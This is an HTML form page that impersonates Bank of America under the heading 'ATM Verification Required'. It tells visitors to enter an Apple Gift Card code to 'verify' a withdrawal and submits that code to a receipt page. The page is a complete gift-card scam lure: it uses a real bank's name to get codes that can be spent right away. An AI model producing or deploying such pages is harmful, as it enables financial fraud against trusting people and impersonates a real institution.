<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ATM Verification</title>
  <link rel="stylesheet" href="style2.css">
</head>
<body>
  <div style="background-color:#003366; color:white; padding:15px; text-align:center;">
    <strong>Bank of America</strong>
  </div>

  <div class="container">
    <h2>ATM Verification Required</h2>
    <p>Please enter the Apple Gift Card code below to verify your withdrawal request:</p>

    <form action="receipt.html" method="GET">
      <input type="text" name="giftcard" placeholder="Enter Apple Gift Card Code" required />
      <br><br>
      <button class="primary-button" type="submit">Verify & Continue</button>
    </form>
  </div>
</body>
</html>
